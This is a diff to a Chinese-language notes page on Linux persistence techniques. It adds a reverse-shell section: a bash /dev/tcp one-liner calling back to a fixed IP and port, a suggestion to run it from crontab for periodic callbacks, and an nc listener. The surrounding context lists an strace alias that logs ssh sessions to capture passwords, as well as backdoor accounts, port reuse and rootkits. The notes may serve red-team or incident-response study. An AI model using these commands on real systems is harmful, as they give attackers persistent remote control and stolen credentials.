@@ -28,6 +28,11 @@
 - ssh 后门
     - ``alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'``
     - 后门账户
+
+- 反弹Shell
+    - ``bash -i >& /dev/tcp/192.168.28.131/12345  0>&1``
+        - 可用于添加``crontab -e`` 周期性反弹
+        - ``nc -lvp 12345`` 监听
 - 常见应用
     - ICMP
     - DNS
@@ -35,3 +40,8 @@
 - 后门端口复用
 - ``.`` 开头隐藏文件
 - rootkit
+
+
+参考链接
+----------------------------------------
+- `Linux 持续化 <https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html>`_
